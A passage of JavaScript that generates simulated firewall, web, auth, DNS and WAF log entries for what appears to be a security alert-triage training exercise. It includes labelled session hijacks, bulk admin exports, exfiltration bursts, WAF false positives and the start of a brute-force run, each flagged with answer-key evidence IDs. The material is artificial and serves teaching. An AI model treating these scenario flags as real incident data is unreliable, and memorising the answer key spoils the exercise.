  /* --- ATTACK: Data exfiltration --- */
  entry('14:24:25', 'fw', 'high',
    'ALLOW TCP 198.51.100.47:39100 → 203.0.113.99:443 — outbound to exfil server',
    { action: 'ALLOW', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 39100, dstIp: '203.0.113.99', dstPort: 443, rule: 'outbound-https-default', bytes: 4410000, note: 'Large outbound transfer to known exfil destination' },
    true, 'data-export');

  entry('14:24:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:24:40', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 72.44.128.90',
    null, false, null);

  entry('14:24:50', 'web', 'info',
    '203.0.113.42 GET /search?q=screen+protector — 200 OK',
    null, false, null);

  /* --- ATTACK: Second session hijack — user mweber --- */
  entry('14:25:00', 'auth', 'critical',
    'User session sess_user_c41b used from NEW IP 198.51.100.47 — was 203.0.113.42',
    { event: 'session_ip_change', user: 'mweber', sessionId: 'sess_user_c41b', previousIp: '203.0.113.42', newIp: '198.51.100.47', note: 'Second session hijack — user account' },
    true, 'session-hijack');

  /* --- ATTACK: Accessing victim account --- */
  entry('14:25:05', 'web', 'high',
    '198.51.100.47 GET /account/orders — 200 OK — python-requests/2.31.0 — accessing mweber account',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/account/orders', status: 200, bytes: 6840, userAgent: 'python-requests/2.31.0', sessionId: 'sess_user_c41b' },
    true, 'session-hijack');

  entry('14:25:10', 'web', 'info',
    '44.192.88.12 GET /search?q=mechanical+keyboard+switches — 200 OK',
    null, false, null);

  entry('14:25:20', 'web', 'info',
    '72.44.128.90 GET /products/desk-organizer — 200 OK',
    null, false, null);

  /* --- ATTACK: Third session hijack — user kpatel --- */
  entry('14:25:30', 'auth', 'critical',
    'User session sess_user_e7f3 used from NEW IP 198.51.100.47 — was 44.192.88.12',
    { event: 'session_ip_change', user: 'kpatel', sessionId: 'sess_user_e7f3', previousIp: '44.192.88.12', newIp: '198.51.100.47', note: 'Third session hijack — user account' },
    true, 'session-hijack');

  /* --- ATTACK: Shipping address change --- */
  entry('14:25:35', 'web', 'high',
    '198.51.100.47 POST /account/address — 200 OK — shipping address changed — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'POST', path: '/account/address', status: 200, bytes: 412, userAgent: 'python-requests/2.31.0', sessionId: 'sess_user_e7f3', note: 'Shipping address modified on hijacked account' },
    true, 'session-hijack');

  entry('14:25:40', 'web', 'info',
    '98.22.156.71 GET /products/desk-lamp-led — 200 OK',
    null, false, null);

  /* --- ATTACK: Browsing payment methods --- */
  entry('14:25:50', 'web', 'high',
    '198.51.100.47 GET /account/payment-methods — 200 OK — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/account/payment-methods', status: 200, bytes: 1820, userAgent: 'python-requests/2.31.0', sessionId: 'sess_user_e7f3', note: 'Attacker viewing saved payment methods' },
    true, 'data-export');

  entry('14:26:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  /* --- ATTACK: Second data exfiltration burst --- */
  entry('14:26:05', 'fw', 'high',
    'ALLOW TCP 198.51.100.47:39105 → 203.0.113.99:443 — outbound to exfil server — 1.8MB',
    { action: 'ALLOW', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 39105, dstIp: '203.0.113.99', dstPort: 443, rule: 'outbound-https-default', bytes: 1887436, note: 'Second exfiltration burst — account data' },
    true, 'data-export');

  /* --- ATTACK: Admin export of order history --- */
  entry('14:26:15', 'web', 'critical',
    '198.51.100.47 GET /admin/orders/export — 200 OK — 2.1MB — order history export',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/admin/orders/export', status: 200, bytes: 2202009, userAgent: 'python-requests/2.31.0', sessionId: 'sess_admin_7f2a', note: 'Bulk order history export including addresses and payment references' },
    true, 'data-export');

  entry('14:26:20', 'web', 'info',
    '203.0.113.42 GET /products/screen-protector-glass — 200 OK',
    null, false, null);

  /* --- ATTACK: Third exfil burst --- */
  entry('14:26:30', 'fw', 'high',
    'ALLOW TCP 198.51.100.47:39110 → 203.0.113.99:443 — outbound to exfil server — 2.2MB',
    { action: 'ALLOW', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 39110, dstIp: '203.0.113.99', dstPort: 443, rule: 'outbound-https-default', bytes: 2210000, note: 'Third exfiltration burst — order data' },
    true, 'data-export');

  entry('14:26:40', 'waf', 'medium',
    'Rate limit warning — 198.51.100.47 — 28 req/min — elevated',
    { rule: 'RATE-001', action: 'LOG_ONLY', srcIp: '198.51.100.47', reqPerMin: 28, threshold: 30 },
    true, 'recon');

  /* ════════════════════════════════════════════════════
     14:27:00 – 15:30:00  Post-attack traffic + aftermath
     ════════════════════════════════════════════════════ */

  entry('14:27:00', 'web', 'info',
    '72.44.128.90 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:27:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44400 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:27:30', 'web', 'info',
    '72.44.128.90 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:27:45', 'web', 'info',
    '72.44.128.90 GET /checkout/confirmation?order=ORD-88417 — 200 OK',
    null, false, null);

  entry('14:28:00', 'web', 'info',
    '52.78.231.108 GET /products/wireless-mouse — 200 OK',
    null, false, null);

  entry('14:28:15', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 52.78.231.108',
    null, false, null);

  entry('14:28:30', 'web', 'info',
    '44.192.88.12 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:28:45', 'auth', 'info',
    'Session renewal sess_user_a91c — expired — user=jthompson',
    null, false, null);

  entry('14:29:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:29:15', 'fw', 'info',
    'ALLOW TCP 98.22.156.71:51200 → 10.0.1.50:443',
    null, false, null);

  entry('14:29:30', 'web', 'info',
    '98.22.156.71 GET /search?q=tablet+case — 200 OK',
    null, false, null);

  entry('14:29:45', 'web', 'info',
    '203.0.113.42 GET /products/power-bank-20000 — 200 OK',
    null, false, null);

  entry('14:30:00', 'web', 'info',
    '72.44.128.90 GET /products — 200 OK',
    null, false, null);

  entry('14:30:15', 'dns', 'info',
    'A query fonts.gstatic.com from 10.0.1.50',
    null, false, null);

  entry('14:30:30', 'fw', 'info',
    'DENY TCP 185.220.101.33:44100 → 10.0.1.50:445 — policy: deny-smb-external',
    null, false, null);

  entry('14:30:45', 'web', 'info',
    '52.78.231.108 GET /search?q=usb+c+adapter — 200 OK',
    null, false, null);

  entry('14:31:00', 'web', 'info',
    '44.192.88.12 POST /cart/add — 200 OK — item=MKB-006',
    null, false, null);

  entry('14:31:15', 'auth', 'info',
    'Login success user=jthompson from 98.22.156.71',
    { event: 'login_success', user: 'jthompson', srcIp: '98.22.156.71', sessionId: 'sess_user_f82d', mfa: false },
    false, null);

  entry('14:31:30', 'web', 'info',
    '98.22.156.71 GET /products/tablet-case-10in — 200 OK',
    null, false, null);

  entry('14:31:45', 'web', 'info',
    '172.217.14.99 GET /products/smart-home-hub — 200 OK — Googlebot/2.1',
    null, false, null);

  entry('14:32:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:32:15', 'waf', 'info',
    'Rate limit check — 72.44.128.90 — 8 req/min — within threshold',
    null, false, null);

  entry('14:32:30', 'web', 'info',
    '203.0.113.42 POST /cart/add — 200 OK — item=PBK-008',
    null, false, null);

  entry('14:32:45', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:49500 → 10.0.1.50:443',
    null, false, null);

  entry('14:33:00', 'web', 'info',
    '72.44.128.90 GET /search?q=desk+mat — 200 OK',
    null, false, null);

  entry('14:33:15', 'dns', 'info',
    'A query updates.shopstack.lab from 10.0.1.50',
    null, false, null);

  entry('14:33:30', 'web', 'info',
    '52.78.231.108 GET /products/usb-c-adapter-hub — 200 OK',
    null, false, null);

  entry('14:33:45', 'web', 'info',
    '44.192.88.12 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:34:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44450 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:34:15', 'web', 'info',
    '44.192.88.12 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:34:30', 'web', 'info',
    '44.192.88.12 GET /checkout/confirmation?order=ORD-88418 — 200 OK',
    null, false, null);

  entry('14:34:45', 'ids', 'info',
    'Hourly summary — 4 alerts, 0 critical, traffic within norms',
    null, false, null);

  entry('14:35:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:35:15', 'web', 'info',
    '98.22.156.71 POST /cart/add — 200 OK — item=TBC-010',
    null, false, null);

  entry('14:35:30', 'auth', 'info',
    'Logout user=mweber session=sess_user_c41b',
    null, false, null);

  entry('14:35:45', 'web', 'info',
    '72.44.128.90 GET /products/desk-mat-xxl — 200 OK',
    null, false, null);

  entry('14:36:00', 'dns', 'info',
    'A query sentry.penumbraforge.com from 10.0.1.50',
    null, false, null);

  entry('14:36:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44460 → 35.186.224.25:443 — NAT outbound sentry',
    null, false, null);

  entry('14:36:30', 'web', 'info',
    '203.0.113.42 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:36:45', 'web', 'info',
    '52.78.231.108 GET /products/phone-mount-car — 200 OK',
    null, false, null);

  entry('14:37:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44470 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:37:15', 'web', 'info',
    '203.0.113.42 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:37:30', 'web', 'info',
    '203.0.113.42 GET /checkout/confirmation?order=ORD-88419 — 200 OK',
    null, false, null);

  entry('14:37:45', 'web', 'info',
    '98.22.156.71 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:38:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:38:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44480 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:38:30', 'web', 'info',
    '98.22.156.71 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:38:45', 'web', 'info',
    '98.22.156.71 GET /checkout/confirmation?order=ORD-88420 — 200 OK',
    null, false, null);

  entry('14:39:00', 'web', 'info',
    '72.44.128.90 POST /cart/add — 200 OK — item=DSM-003',
    null, false, null);

  entry('14:39:15', 'auth', 'info',
    'Session renewal sess_user_f82d for user=jthompson',
    null, false, null);

  entry('14:39:30', 'dns', 'info',
    'PTR query 99.113.0.203.in-addr.arpa from 10.0.1.50',
    null, false, null);

  entry('14:39:45', 'web', 'info',
    '44.192.88.12 GET /search?q=webcam+mount — 200 OK',
    null, false, null);

  entry('14:40:00', 'fw', 'info',
    'ALLOW TCP 52.78.231.108:59001 → 10.0.1.50:443',
    null, false, null);

  entry('14:40:15', 'web', 'info',
    '52.78.231.108 POST /cart/add — 200 OK — item=PMC-002',
    null, false, null);

  entry('14:40:30', 'web', 'info',
    '13.107.42.14 GET /products/bluetooth-speaker-xl — 200 OK — bingbot/2.0',
    null, false, null);

  entry('14:40:45', 'auth', 'info',
    'Logout user=kpatel session=sess_user_e7f3',
    null, false, null);

  entry('14:41:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:41:15', 'web', 'info',
    '72.44.128.90 GET /products/cable-management-kit — 200 OK',
    null, false, null);

  entry('14:41:30', 'web', 'info',
    '98.22.156.71 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:41:45', 'dns', 'info',
    'A query api.stripe.com from 10.0.1.50',
    null, false, null);

  entry('14:42:00', 'fw', 'info',
    'ALLOW TCP 203.0.113.42:60200 → 10.0.1.50:443',
    null, false, null);

  entry('14:42:15', 'web', 'info',
    '203.0.113.42 GET /products — 200 OK',
    null, false, null);

  entry('14:42:30', 'web', 'info',
    '44.192.88.12 GET /products/webcam-mount-arm — 200 OK',
    null, false, null);

  entry('14:42:45', 'waf', 'info',
    'Rate limit check — 52.78.231.108 — 6 req/min — within threshold',
    null, false, null);

  entry('14:43:00', 'web', 'info',
    '52.78.231.108 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:43:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44510 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:43:30', 'web', 'info',
    '52.78.231.108 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:43:45', 'web', 'info',
    '52.78.231.108 GET /checkout/confirmation?order=ORD-88421 — 200 OK',
    null, false, null);

  entry('14:44:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:44:15', 'web', 'info',
    '72.44.128.90 GET /search?q=phone+charger — 200 OK',
    null, false, null);

  entry('14:44:30', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    { event: 'login_success', user: 'mweber', srcIp: '203.0.113.42', sessionId: 'sess_user_d55a', mfa: false },
    false, null);

  entry('14:44:45', 'dns', 'info',
    'AAAA query shopstack.lab.penumbraforge.com from 52.78.231.108',
    null, false, null);

  entry('14:45:00', 'web', 'info',
    '203.0.113.42 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:45:15', 'fw', 'info',
    'DENY TCP 185.220.101.33:44200 → 10.0.1.50:1433 — policy: deny-mssql-external',
    null, false, null);

  entry('14:45:30', 'web', 'info',
    '98.22.156.71 GET /products/phone-charger-fast — 200 OK',
    null, false, null);

  entry('14:45:45', 'web', 'info',
    '44.192.88.12 GET /products — 200 OK',
    null, false, null);

  entry('14:46:00', 'web', 'info',
    '72.44.128.90 GET /products/phone-charger-fast — 200 OK',
    null, false, null);

  entry('14:46:15', 'ids', 'low',
    'Repeated connection attempts from 185.220.101.33 — 4 blocked ports in 45min',
    { alertId: 'CUSTOM-SCAN-002', srcIp: '185.220.101.33', dstIp: '10.0.1.50', blockedPorts: [22, 3389, 445, 1433], action: 'ALERT' },
    false, null);

  entry('14:46:30', 'web', 'info',
    '203.0.113.42 GET /products/cable-organizer — 200 OK',
    null, false, null);

  entry('14:46:45', 'dns', 'info',
    'A query status.stripe.com from 10.0.1.50',
    null, false, null);

  entry('14:47:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:47:15', 'fw', 'info',
    'ALLOW TCP 98.22.156.71:51300 → 10.0.1.50:443',
    null, false, null);

  entry('14:47:30', 'web', 'info',
    '98.22.156.71 GET /search?q=ergonomic+mouse — 200 OK',
    null, false, null);

  entry('14:47:45', 'web', 'info',
    '72.44.128.90 POST /cart/add — 200 OK — item=PCF-001',
    null, false, null);

  entry('14:48:00', 'auth', 'info',
    'Session renewal sess_user_d55a for user=mweber',
    null, false, null);

  entry('14:48:30', 'web', 'info',
    '44.192.88.12 GET /search?q=docking+station — 200 OK',
    null, false, null);

  entry('14:49:00', 'web', 'info',
    '52.78.231.108 GET /products/wireless-mouse — 200 OK',
    null, false, null);

  entry('14:49:30', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 98.22.156.71',
    null, false, null);

  entry('14:50:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:50:30', 'web', 'info',
    '98.22.156.71 GET /products/ergonomic-mouse-vertical — 200 OK',
    null, false, null);

  entry('14:51:00', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:49600 → 10.0.1.50:443',
    null, false, null);

  entry('14:51:30', 'web', 'info',
    '72.44.128.90 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:52:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44550 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:52:30', 'web', 'info',
    '72.44.128.90 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:53:00', 'web', 'info',
    '72.44.128.90 GET /checkout/confirmation?order=ORD-88422 — 200 OK',
    null, false, null);

  entry('14:53:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:54:00', 'web', 'info',
    '203.0.113.42 POST /cart/add — 200 OK — item=CBO-014',
    null, false, null);

  entry('14:54:30', 'auth', 'info',
    'Logout user=admin session=sess_admin_7f2a from 10.0.0.5',
    { event: 'logout', user: 'admin', srcIp: '10.0.0.5', sessionId: 'sess_admin_7f2a' },
    false, null);

  entry('14:55:00', 'web', 'info',
    '44.192.88.12 GET /products/docking-station-usbc — 200 OK',
    null, false, null);

  entry('14:55:30', 'dns', 'info',
    'A query cdn.shopstack.lab from 104.16.55.2',
    null, false, null);

  entry('14:56:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:56:30', 'web', 'info',
    '98.22.156.71 POST /cart/add — 200 OK — item=ERM-007',
    null, false, null);

  entry('14:57:00', 'fw', 'info',
    'ALLOW TCP 52.78.231.108:59100 → 10.0.1.50:443',
    null, false, null);

  entry('14:57:30', 'web', 'info',
    '52.78.231.108 GET /search?q=keyboard+wrist+rest — 200 OK',
    null, false, null);

  entry('14:58:00', 'web', 'info',
    '203.0.113.42 GET /products/hdmi-cable-4k — 200 OK',
    null, false, null);

  entry('14:58:30', 'auth', 'info',
    'Logout user=jthompson session=sess_user_f82d',
    null, false, null);

  entry('14:59:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:59:30', 'waf', 'info',
    'Daily rule update check — ModSecurity CRS 3.3.5 — no updates available',
    null, false, null);

  entry('15:00:00', 'dns', 'info',
    'A query time.google.com from 10.0.1.50',
    null, false, null);

  entry('15:00:30', 'web', 'info',
    '72.44.128.90 GET /products/monitor-arm-dual — 200 OK',
    null, false, null);

  entry('15:01:00', 'fw', 'info',
    'ALLOW TCP 44.192.88.12:38000 → 10.0.1.50:443',
    null, false, null);

  entry('15:01:30', 'web', 'info',
    '44.192.88.12 GET /products/laptop-bag-15in — 200 OK',
    null, false, null);

  entry('15:02:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:02:30', 'web', 'info',
    '98.22.156.71 GET /search?q=webcam+ring+light — 200 OK',
    null, false, null);

  entry('15:03:00', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 44.192.88.12',
    null, false, null);

  entry('15:03:30', 'web', 'info',
    '203.0.113.42 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('15:04:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44600 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('15:04:30', 'web', 'info',
    '203.0.113.42 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('15:05:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:05:30', 'web', 'info',
    '203.0.113.42 GET /checkout/confirmation?order=ORD-88423 — 200 OK',
    null, false, null);

  entry('15:06:00', 'web', 'info',
    '72.44.128.90 GET /search?q=mousepad — 200 OK',
    null, false, null);

  entry('15:07:00', 'auth', 'info',
    'Login success user=lcheng from 72.44.128.90',
    { event: 'login_success', user: 'lcheng', srcIp: '72.44.128.90', sessionId: 'sess_user_g93b', mfa: false },
    false, null);

  entry('15:08:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:09:00', 'web', 'info',
    '72.44.128.90 GET /account/wishlist — 200 OK',
    null, false, null);

  entry('15:10:00', 'dns', 'info',
    'A query analytics.shopstack.lab from 10.0.1.50',
    null, false, null);

  entry('15:11:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:12:00', 'fw', 'info',
    'ALLOW TCP 98.22.156.71:51400 → 10.0.1.50:443',
    null, false, null);

  entry('15:13:00', 'web', 'info',
    '98.22.156.71 GET /products — 200 OK',
    null, false, null);

  entry('15:14:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:15:00', 'web', 'info',
    '44.192.88.12 GET /search?q=laptop+sleeve — 200 OK',
    null, false, null);

  entry('15:16:00', 'auth', 'info',
    'Session renewal sess_user_d55a for user=mweber',
    null, false, null);

  entry('15:17:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:18:00', 'web', 'info',
    '52.78.231.108 GET /products/keyboard-wrist-rest — 200 OK',
    null, false, null);

  entry('15:19:00', 'dns', 'info',
    'A query api.stripe.com from 10.0.1.50',
    null, false, null);

  entry('15:20:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:21:00', 'web', 'info',
    '72.44.128.90 GET /products/mousepad-xxl — 200 OK',
    null, false, null);

  entry('15:22:00', 'fw', 'info',
    'ALLOW TCP 203.0.113.42:60300 → 10.0.1.50:443',
    null, false, null);

  entry('15:23:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:24:00', 'web', 'info',
    '203.0.113.42 GET /products/laptop-stand-adjustable — 200 OK',
    null, false, null);

  entry('15:25:00', 'auth', 'info',
    'Logout user=mweber session=sess_user_d55a',
    null, false, null);

  entry('15:26:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:27:00', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 13.107.42.14',
    null, false, null);

  entry('15:28:00', 'web', 'info',
    '13.107.42.14 GET /products/noise-cancel-headphones — 200 OK — bingbot/2.0',
    null, false, null);

  entry('15:29:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('15:29:30', 'auth', 'info',
    'Logout user=lcheng session=sess_user_g93b',
    null, false, null);

  entry('15:30:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  /* ════════════════════════════════════════════════════
     Corpus factory — reusable entry builder per scenario
     ════════════════════════════════════════════════════ */

  function makeCorpus(datePrefix) {
    var arr = [];
    var _cid = { waf: 0, web: 0, fw: 0, ids: 0, auth: 0, dns: 0, email: 0 };
    function cId(source) {
      _cid[source] = (_cid[source] || 0) + 1;
      return source + '-' + String(_cid[source]).padStart(3, '0');
    }
    function e(ts, source, severity, summary, detail, suspicious, evidenceId) {
      var obj = {
        id: cId(source),
        timestamp: datePrefix + ts,
        source: source,
        severity: severity,
        summary: summary,
        detail: detail || null,
        raw: detail ? JSON.stringify(detail, null, 2) : null,
        suspicious: !!suspicious,
        evidenceId: evidenceId || null
      };
      arr.push(obj);
    }
    return { entries: arr, e: e };
  }

  /* ════════════════════════════════════════════════════
     Alert Triage — 2024-04-02 08:00–09:30 UTC
     ════════════════════════════════════════════════════

     Attacker:   45.33.32.100
     Target:     10.0.2.20 (portal.acmecorp.lab)
     Admin IP:   10.0.0.5
     Health chk: 10.0.4.55

     Normal users:
       72.44.128.90   — US east coast employee
       98.22.156.71   — US midwest employee
       203.0.113.42   — EU employee
       172.217.14.99  — Google crawler
       13.107.42.14   — Bing crawler
       91.189.92.10   — internal monitoring
     ════════════════════════════════════════════════════ */

  var _at = makeCorpus('2024-04-02 ');

  /* ── Pre-incident normal traffic ─────────────────── */

  _at.e('08:00:01', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    { srcIp: '10.0.4.55', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/api/health', status: 200, bytes: 48, userAgent: 'internal-monitor/1.0' },
    false, null);

  _at.e('08:00:15', 'web', 'info',
    '72.44.128.90 GET / — 200 OK — Mozilla/5.0 (Windows NT 10.0)',
    { srcIp: '72.44.128.90', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/', status: 200, bytes: 14200, userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
    false, null);

  _at.e('08:00:30', 'auth', 'info',
    'Login success user=jthompson from 72.44.128.90',
    { event: 'login_success', user: 'jthompson', srcIp: '72.44.128.90', sessionId: 'sess_jt_01a2', mfa: true },
    false, null);

  _at.e('08:00:45', 'web', 'info',
    '98.22.156.71 GET / — 200 OK — Mozilla/5.0 (Macintosh)',
    null, false, null);

  _at.e('08:01:00', 'auth', 'info',
    'Login success user=kmorales from 98.22.156.71',
    { event: 'login_success', user: 'kmorales', srcIp: '98.22.156.71', sessionId: 'sess_km_33b1', mfa: true },
    false, null);

  _at.e('08:01:15', 'web', 'info',
    '172.217.14.99 GET /robots.txt — 200 OK — Googlebot/2.1',
    { srcIp: '172.217.14.99', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/robots.txt', status: 200, bytes: 240, userAgent: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
    false, null);

  _at.e('08:01:30', 'web', 'info',
    '172.217.14.99 GET /about — 200 OK — Googlebot/2.1',
    null, false, null);

  _at.e('08:01:45', 'waf', 'low',
    'Rate limit warning: 172.217.14.99 — 28 req/min (threshold 30)',
    { srcIp: '172.217.14.99', rule: 'rate-limit-soft', action: 'LOG', reqPerMin: 28, threshold: 30 },
    false, null);

  _at.e('08:02:00', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _at.e('08:02:15', 'web', 'info',
    '13.107.42.14 GET /sitemap.xml — 200 OK — bingbot/2.0',
    { srcIp: '13.107.42.14', dstIp: '10.0.2.20', dstPort: 443, method: 'GET', path: '/sitemap.xml', status: 200, bytes: 3200, userAgent: 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)' },
    false, null);

  _at.e('08:02:30', 'web', 'info',
    '98.22.156.71 GET /reports/quarterly — 200 OK',
    null, false, null);

  _at.e('08:02:45', 'web', 'info',
    '203.0.113.42 GET / — 200 OK — Mozilla/5.0 (X11; Linux x86_64)',
    null, false, null);

  _at.e('08:03:00', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    { event: 'login_success', user: 'mweber', srcIp: '203.0.113.42', sessionId: 'sess_mw_e81c', mfa: true },
    false, null);

  _at.e('08:03:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _at.e('08:03:30', 'waf', 'medium',
    'SQL injection pattern in query: 72.44.128.90 GET /search?q=WHERE+to+buy+laptop',
    { srcIp: '72.44.128.90', dstIp: '10.0.2.20', rule: 'sqli-detect-generic', action: 'LOG', method: 'GET', path: '/search?q=WHERE+to+buy+laptop', matchedPattern: 'WHERE', riskScore: 15 },
    false, 'false-positive-sql');

  _at.e('08:03:45', 'web', 'info',
    '72.44.128.90 GET /search?q=WHERE+to+buy+laptop — 200 OK',
    null, false, null);

  _at.e('08:04:00', 'web', 'info',
    '98.22.156.71 GET /api/notifications — 200 OK',
    null, false, null);

  _at.e('08:04:15', 'web', 'info',
    '203.0.113.42 GET /reports/annual — 200 OK',
    null, false, null);

  _at.e('08:04:30', 'waf', 'low',
    'Rate limit warning: 13.107.42.14 — 25 req/min (threshold 30)',
    null, false, null);

  _at.e('08:04:45', 'web', 'info',
    '72.44.128.90 GET /products/laptops — 200 OK',
    null, false, null);

  _at.e('08:05:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _at.e('08:05:15', 'waf', 'medium',
    'SQL injection pattern in query: 98.22.156.71 GET /search?q=SELECT+model+laptop',
    { srcIp: '98.22.156.71', dstIp: '10.0.2.20', rule: 'sqli-detect-generic', action: 'LOG', method: 'GET', path: '/search?q=SELECT+model+laptop', matchedPattern: 'SELECT', riskScore: 15 },
    false, 'false-positive-sql');

  _at.e('08:05:30', 'web', 'info',
    '98.22.156.71 GET /search?q=SELECT+model+laptop — 200 OK',
    null, false, null);

  _at.e('08:05:45', 'waf', 'medium',
    'XSS pattern in query: 203.0.113.42 GET /search?q=<best>+deals',
    { srcIp: '203.0.113.42', dstIp: '10.0.2.20', rule: 'xss-detect-generic', action: 'LOG', method: 'GET', path: '/search?q=<best>+deals', matchedPattern: '<best>', riskScore: 10 },
    false, 'misconfigured-rule');

  _at.e('08:06:00', 'web', 'info',
    '203.0.113.42 GET /search?q=<best>+deals — 200 OK',
    null, false, null);

  /* ── Brute force attack begins ───────────────────── */

  _at.e('08:06:30', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 1 },
    true, 'brute-force');

  _at.e('08:06:33', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
    { event: 'login_failure', user: 'admin', srcIp: '45.33.32.100', reason: 'invalid_password', attemptNum: 2 },
    true, 'brute-force');

  _at.e('08:06:36', 'auth', 'warning',
    'Login failure user=admin from 45.33.32.100 — invalid password',
